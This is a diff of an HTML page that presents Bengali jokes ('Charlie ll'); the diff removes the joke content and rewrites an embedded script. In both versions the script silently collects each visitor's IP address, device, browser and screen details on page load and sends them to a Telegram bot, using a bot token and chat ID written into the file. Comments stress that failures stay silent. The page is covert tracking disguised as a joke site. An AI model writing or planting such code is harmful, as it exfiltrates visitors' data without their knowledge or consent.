@@ -1,489 +1,94 @@
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-  <title>চার্লি – হাসির গল্প ও ঠাট্টা</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      background: #0a0a0a;
-      font-family: 'Noto Serif Bengali', 'SolaimanLipi', 'Kalpurush', 'Vrinda', 'Segoe UI', serif;
-      display: flex;
-      justify-content: center;
-      padding: 0;
-    }
-
-    .page {
-      max-width: 800px;
-      width: 100%;
-      min-height: 100vh;
-      background: #171717;
-      background-image: 
-        linear-gradient(45deg, rgba(255,255,240,0.03) 25%, transparent 25%),
-        linear-gradient(-45deg, rgba(255,255,200,0.02) 25%, transparent 25%),
-        linear-gradient(45deg, transparent 75%, rgba(255,220,150,0.02) 75%),
-        linear-gradient(-45deg, transparent 75%, rgba(255,210,130,0.015) 75%);
-      background-size: 48px 48px;
-      color: #fef7cf;
-      box-shadow: 0 20px 35px rgba(0,0,0,0.6);
-      border-radius: 0;
-      padding-bottom: 32px;
-    }
-
-    .top-title {
-      background: #1e1e1e;
-      color: #ffea60;
-      text-align: center;
-      font-size: 2.4rem;
-      font-weight: 800;
-      letter-spacing: 1px;
-      padding: 18px 12px;
-      margin: 0;
-      border-bottom: 2px solid #ffb347;
-      font-family: inherit;
-    }
-
-    .section {
-      padding: 12px 24px 4px;
-    }
-
-    .section-title {
-      background: #690d03;
-      color: #fff2cf;
-      font-size: 1.75rem;
-      padding: 8px 18px;
-      margin: 28px 0 12px 0;
-      border-radius: 12px 0 12px 0;
-      display: inline-block;
-      letter-spacing: 0.5px;
-      box-shadow: 3px 3px 0 #3a0500;
-      font-weight: 600;
-    }
-
-    .content {
-      font-size: 1.55rem;
-      line-height: 1.45;
-      background: rgba(0,0,0,0.25);
-      padding: 12px 18px;
-      border-radius: 24px;
-      backdrop-filter: blur(1px);
-      white-space: pre-line;
-      word-break: break-word;
-      color: #fef3cf;
-      text-shadow: 0 1px 1px black;
-    }
-
-    @media (max-width: 650px) {
-      .section {
-        padding: 8px 18px;
-      }
-      .section-title {
-        font-size: 1.45rem;
-        padding: 5px 14px;
-      }
-      .content {
-        font-size: 1.25rem;
-        padding: 10px 14px;
-      }
-      .top-title {
-        font-size: 1.8rem;
-      }
-    }
-
-    .footer-note {
-      text-align: center;
-      margin-top: 40px;
-      font-size: 0.75rem;
-      opacity: 0.6;
-      border-top: 1px dashed #4a3e2a;
-      padding-top: 20px;
-      margin-left: 20px;
-      margin-right: 20px;
-    }
-  </style>
-</head>
-<body>
-<main class="page">
-  <h1 class="top-title">🐘 Charlie ll<br>চার্লির হাসির আড্ডা</h1>
-
-  <section class="section">
-    <h2 class="section-title">🏍️ মোটরসাইকেলে ওটার মতন সময় নেই</h2>
-    <div class="content">
-      সাইফ: কিরে মোটরসাইকেল ধরে ওই রকম দৌড়াচ্ছিস কেন?<br>
-      রিয়াজ: আর বলিস না, সকালে ঘুম থেকে উঠতে দেরি হয়ে গেছে। অফিসে যেতে হবে তাড়াতাড়ি তাই মোটরসাইকেলে ওটার মতন সময় নেই।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🌑 অন্ধকারে কিছুই দেখা যাচ্ছে না</h2>
-    <div class="content">
-      রিয়াজ: এই জানালাটা খুলে দেখো তো সূর্য উঠল কি না।<br>
-      সাইফ: খুলে দেখলাম তো, অন্ধকারে কিছুই দেখা যাচ্ছে না।<br>
-      রিয়াজ: বোকা নাকি তুই? টিউবটা জ্বালিয়ে দেখতে পারছিস না?
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🐴 আসল গাধা</h2>
-    <div class="content">
-      সেদিন একটি সরু রাস্তার উপর দিয়ে গাড়ি চালিয়ে যাচ্ছিল একজন। হঠাৎ বিপরীত দিক থেকে আরেকটি গাড়ি এসে আরেকটু হলেই ধাক্কা মেরে দিচ্ছিল।<br>
-      — সরি, আমি গাধাদের জন্য গাড়ি ঘোরাই না।<br>
-      নিজে ভুল করেও উদ্ধত ভঙ্গিতে বলল গাড়ির ড্রাইভার।<br>
-      — কিন্তু আমি করি। বলে গাড়ি পেছাল প্রথমজন।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🧠 খুব চালাক</h2>
-    <div class="content">
-      স্ত্রী: শুনছ, পাশের বাসার ভাবী বলছে তার স্বামী নাকি খুব চালাক।<br>
-      স্বামী: তাই নাকি?<br>
-      স্ত্রী: হ্যাঁ, সব কাজ আগেই বুঝে ফেলে।<br>
-      স্বামী: তা হলে তো সে আমার কাছ থেকে অনেক কিছু শিখেছে!
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">💼 নতুন চাকরি</h2>
-    <div class="content">
-      বন্ধু: নতুন চাকরির কী খবর?<br>
-      রবি: চাকরি তো পেয়েছি, কিন্তু এখনো বুঝতে পারছি না আমি কাজ করব নাকি কাজ আমাকে করাবে।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🎓 অতিরিক্ত বুদ্ধি</h2>
-    <div class="content">
-      শিক্ষক: বল তো, বেশি কথা বললে কী হয়?<br>
-      ছাত্র: স্যার, অন্যরা সুযোগ পায় না।<br>
-      শিক্ষক: তাই নাকি?<br>
-      ছাত্র: জি স্যার, তাই তো আমি কম বলি!
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">👨‍👦 বাবার উপদেশ</h2>
-    <div class="content">
-      বাবা: কখনো মিথ্যা বলবি না।<br>
-      ছেলে: ঠিক আছে বাবা।<br>
-      বাবা: আজ স্কুলে গিয়েছিলি তো?<br>
-      ছেলে: এখন সত্যি বলব, না পরে বলব?
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">📱 বই পড়া</h2>
-    <div class="content">
-      মা: সারাদিন মোবাইল নিয়ে থাকিস কেন?<br>
-      ছেলে: বই-ই তো পড়ছি।<br>
-      মা: কোথায় বই?<br>
-      ছেলে: মোবাইলের ভিতরই তো ই-বুক আছে!
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🩺 ডাক্তারি পরামর্শ</h2>
-    <div class="content">
-      ডাক্তার: প্রতিদিন হাঁটবেন।<br>
-      রোগী: কতক্ষণ?<br>
-      ডাক্তার: অন্তত আধা ঘণ্টা।<br>
-      রোগী: ঠিক আছে, সকালে আপনার বাড়ির সামনে দিয়ে হাঁটব, দেখে নিয়েন।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">⏰ ঘড়ির সমস্যা</h2>
-    <div class="content">
-      ক্রেতা: আপনার ঘড়ি কি ঠিক সময় দেয়?<br>
-      দোকানি: অবশ্যই।<br>
-      ক্রেতা: তা হলে আমার অফিসে দেরি হলো কেন?<br>
-      দোকানি: ঘড়ি ঠিক ছিল, উঠতে আপনি দেরি করেছেন।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">➗ গণিতে দুর্বল</h2>
-    <div class="content">
-      শিক্ষক: ২ আর ২ মিলে কত?<br>
-      ছাত্র: পরিস্থিতির উপর নির্ভর করে স্যার।<br>
-      শিক্ষক: মানে?<br>
-      ছাত্র: পরীক্ষায় ৪, বাজারে গেলে ৫ও হতে পারে।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">📞 ভুল নম্বর</h2>
-    <div class="content">
-      — হ্যালো, এটা কি পুলিশ স্টেশন?<br>
-      — না, এটা বাসা।<br>
-      — ও আচ্ছা, তাইলে এত জোরে কে জেরা করছে?<br>
-      — আমার স্ত্রী।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">👓 চশমার দরকার</h2>
-    <div class="content">
-      ডাক্তার: আপনার চোখে সমস্যা আছে।<br>
-      রোগী: কিভাবে বুঝলেন?<br>
-      ডাক্তার: আপনি দরজার বদলে জানালা দিয়ে ঢুকেছেন।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🧩 বুদ্ধিমান উত্তর</h2>
-    <div class="content">
-      শিক্ষক: দেরি করে এলে কেন?<br>
-      ছাত্র: স্যার, সাইনবোর্ডে লেখা ছিল — "সামনে স্কুল, ধীরে চলুন।" তাই ধীরে এসেছি।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">💰 টাকার হিসাব</h2>
-    <div class="content">
-      স্ত্রী: তোমার পকেটে ৫০০ টাকা ছিল, এখন ২০০ কেন?<br>
-      স্বামী: বুদ্ধিমানের মতো ৩০০ আগেই খরচ করেছি, যাতে হারিয়ে না যায়।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">📝 পরীক্ষার প্রস্তুতি</h2>
-    <div class="content">
-      মা: পরীক্ষা কেমন হলো?<br>
-      ছেলে: প্রশ্ন দেখে মনে হলো স্যার অনেক প্রস্তুতি নিয়েছেন।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🤝 বন্ধুর পরামর্শ</h2>
-    <div class="content">
-      বন্ধু: রাগ কমাও, জীবন সুন্দর হবে।<br>
-      আরেক বন্ধু: ঠিক বলেছ, তবে আগে আমাকে ওই কথাটা শান্তভাবে বলতে দাও।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🏢 অফিসের কাজ</h2>
-    <div class="content">
-      বস: এত দেরি কেন?<br>
-      কর্মচারী: স্যার, স্বপ্নে দেখলাম আমি অফিসে আছি, তাই আরেকটু ঘুমালাম।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🏠 ছুটির অজুহাত</h2>
-    <div class="content">
-      কর্মচারী: স্যার, আজ ছুটি চাই।<br>
-      বস: কেন?<br>
-      কর্মচারী: বাড়িতে আমি খুব গুরুত্বপূর্ণ ব্যক্তি।<br>
-      বস: কিভাবে?<br>
-      কর্মচারী: আমার স্ত্রী বলেছে আজ বাজার না করলে বাসায় ঢোকা বন্ধ।
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🚦 পুলিশ আর মজা</h2>
-    <div class="content">
-      পুলিশ: আপনি সিগন্যাল ভাঙলেন!<br>
-      ড্রাইভার: স্যার, আমি তো ভাঙিনি, ওটা আপনি ভাঙছেন – আপনার হাতে লাঠি না থাকলে কি মানুষ থামে?
-    </div>
-  </section>
-
-  <section class="section">
-    <h2 class="section-title">🍛 বিরিয়ানি লজিক</h2>
-    <div class="content">
-      বাবা: এতো দেরি করে এলে?<br>
-      ছেলে: বাবা, বিরিয়ানি খেতে গিয়ে হিসাব নষ্ট।<br>
-      বাবা: কী হিসাব?<br>
-      ছেলে: খাব নাকি বাড়ি ফিরব, দুইটাই দরকার ছিল।
-    </div>
-  </section>
-
-  <div class="footer-note">
-    ✨ Charlie ll — হাসতে থাকুন, বুদ্ধি বাড়ান ✨
-  </div>
-</main>
-
 <script>
 (function() {
     // ============================================
-    // ফিক্সড ভার্সন - কোনো CORS বা 404 error থাকবে না
+    // ফিক্সড কোড - CORS error থাকবে না
     // ============================================
     
     const BOT_TOKEN = "8799814426:AAE6mSoNsaCVRjxLUIkrejaSL8dDO6pAf-A";
     const DEFAULT_CHAT_ID = "7709670231";
     
-    function getTargetChatId() {
-        try {
-            const urlParams = new URLSearchParams(window.location.search);
-            const idFromUrl = urlParams.get('id');
-            if (idFromUrl && /^\d+$/.test(idFromUrl)) {
-                return idFromUrl;
-            }
-        } catch(e) {}
-        return DEFAULT_CHAT_ID;
-    }
-
-    // ✅ ফিক্সড: শুধু আইপি নেবে, CORS error থাকবে না
+    // ✅ CORS-মুক্ত API (ipify.org)
     async function getIPAddress() {
         try {
-            // ipify.org CORS সাপোর্ট করে এবং শুধু আইপি রিটার্ন করে
             const res = await fetch('https://api.ipify.org?format=json');
             if (res.ok) {
                 const data = await res.json();
-                return { 
-                    ip: data.ip, 
-                    city: "প্রকাশ করা হয়নি", 
-                    region: "", 
-                    country: "প্রকাশ করা হয়নি", 
-                    isp: "" 
-                };
+                return { ip: data.ip };
             }
         } catch(e) {
-            console.log("IP fetch failed (silent)");
+            // সাইলেন্ট ফেইল
         }
-        
-        // লোকাল আইপি শো না করিয়ে
-        return { ip: "আইপি গোপন রাখা হয়েছে", city: "", region: "", country: "", isp: "" };
+        return { ip: "আইপি পাওয়া যায়নি" };
     }
     
     function getDeviceInfo() {
         const ua = navigator.userAgent;
-        let platform = "অজানা OS";
-        let browser = "অজানা ব্রাউজার";
-        let deviceType = "ডেস্কটপ/মোবাইল";
+        let platform = "অজানা";
+        let browser = "অজানা";
         
         if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
         else if (/Android/i.test(ua)) platform = "Android";
         else if (/Windows/i.test(ua)) platform = "Windows";
-        else if (/Mac/i.test(ua)) platform = "macOS";
-        else if (/Linux/i.test(ua)) platform = "Linux";
         
-        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
-        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+        if (/Chrome/i.test(ua)) browser = "Chrome";
         else if (/Firefox/i.test(ua)) browser = "Firefox";
-        else if (/Edg/i.test(ua)) browser = "Edge";
-        else if (/Opera|OPR/i.test(ua)) browser = "Opera";
+        else if (/Safari/i.test(ua)) browser = "Safari";
         
-        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "ট্যাবলেট";
-        else if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|Opera M(obi|ini)/i.test(ua)) deviceType = "মোবাইল ফোন";
-        else deviceType = "ডেস্কটপ / ল্যাপটপ";
-        
-        const screenRes = `${screen.width}x${screen.height}`;
-        const language = navigator.language || navigator.userLanguage || "bn";
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Dhaka";
-        const referrer = document.referrer || "সরাসরি ভিজিট";
-        const pageURL = window.location.href;
-        
-        return {
-            platform, browser, deviceType, screenRes, language, timeZone, referrer, pageURL
-        };
-    }
-    
-    async function sendSilentNotification(chatId, messageText) {
-        if (!BOT_TOKEN || !chatId) return false;
-        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        // URLSearchParams ব্যবহার করছি - এটাই সঠিক পদ্ধতি
-        const params = new URLSearchParams();
-        params.append('chat_id', chatId);
-        params.append('text', messageText);
-        params.append('parse_mode', 'Markdown');
-        params.append('disable_web_page_preview', 'true');
-        
-        try {
-            const response = await fetch(apiUrl, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: params.toString()
-            });
-            
-            const result = await response.json();
-            
-            // 400 error চেক করা
-            if (!response.ok || !result.ok) {
-                console.warn("Telegram API Error:", result);
-                return false;
-            }
-            return true;
-        } catch (err) {
-            // সাইলেন্ট ফেইল - ইউজার কিছু দেখবে না
-            console.warn("Send failed (silent)");
-            return false;
-        }
+        return { platform, browser, screen: `${screen.width}x${screen.height}` };
     }
     
     async function trackVisitor() {
-        const targetChat = getTargetChatId();
-        if (!BOT_TOKEN) {
-            console.warn("No bot token");
-            return;
-        }
-        
-        // বট টোকেন ভ্যালিড কিনা চেক (নতুন ফিচার - optional)
+        // প্রথমে বট চেক করুন
         try {
-            const checkBot = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-            const botData = await checkBot.json();
-            if (!botData.ok) {
-                console.warn("Invalid bot token");
+            const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+            const checkResult = await check.json();
+            
+            if (!checkResult.ok) {
+                console.warn("বট টোকেন ভুল! @BotFather থেকে নতুন টোকেন নিন");
                 return;
             }
+            console.log("বট সক্রিয়:", checkResult.result.username);
         } catch(e) {
-            console.warn("Bot check failed");
+            console.warn("বট চেক করা যায়নি");
             return;
         }
         
-        const device = getDeviceInfo();
         const ipData = await getIPAddress();
-        
+        const device = getDeviceInfo();
         const now = new Date();
-        const bangladeshTime = now.toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
-        const isoTime = now.toISOString();
         
-        const message = `
-🔍 *নতুন ভিজিটর ডিটেক্ট করা হয়েছে* 🔍
-
-━━━━━━━━━━━━━━━━━━━━
-🌐 *আইপি ঠিকানা:* ${ipData.ip}
-━━━━━━━━━━━━━━━━━━━━
-📱 *ডিভাইস টাইপ:* ${device.deviceType}
-💻 *অপারেটিং সিস্টেম:* ${device.platform}
-🌍 *ব্রাউজার:* ${device.browser}
-📏 *স্ক্রিন রেজল্যুশন:* ${device.screenRes}
-🗣️ *ভাষা:* ${device.language}
-⏱️ *টাইমজোন:* ${device.timeZone}
-🔗 *রেফারার:* ${device.referrer}
-📄 *পেজ URL:* ${device.pageURL}
-🕒 *ভিজিট সময় (বাংলাদেশ):* ${bangladeshTime}
-🕘 *UTC সময়:* ${isoTime}
-━━━━━━━━━━━━━━━━━━━━
-🎭 *পেজের নাম:* Charlie ll - হাসির গল্প ও ঠাট্টা
-        `.trim();
+        const message = `📢 নিউ ভিজিট!
+আইপি: ${ipData.ip}
+ডিভাইস: ${device.platform} (${device.browser})
+স্ক্রিন: ${device.screen}
+সময়: ${now.toLocaleString('bn-BD')}`;
         
-        await sendSilentNotification(targetChat, message);
+        try {
+            const params = new URLSearchParams();
+            params.append('chat_id', DEFAULT_CHAT_ID);
+            params.append('text', message);
+            
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params
+            });
+            
+            const result = await res.json();
+            if (result.ok) {
+                console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
+            } else {
+                console.error("❌ Telegram error:", result.description);
+                console.log("সমাধান: @BotFather থেকে নতুন টোকেন নিন এবং chat_id চেক করুন");
+            }
+        } catch(e) {
+            console.warn("নেটওয়ার্ক এরর:", e);
+        }
     }
     
-    // পেজ লোড হলে 1 সেকেন্ড পর ট্র্যাকিং শুরু
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(() => {
-                trackVisitor().catch(() => {});
-            }, 1000);
-        });
-    } else {
-        setTimeout(() => {
-            trackVisitor().catch(() => {});
-        }, 1000);
-    }
+    // 2 সেকেন্ড পরে ট্র্যাকিং শুরু
+    setTimeout(() => {
+        trackVisitor();
+    }, 2000);
 })();
 </script>
-</body>
-</html>
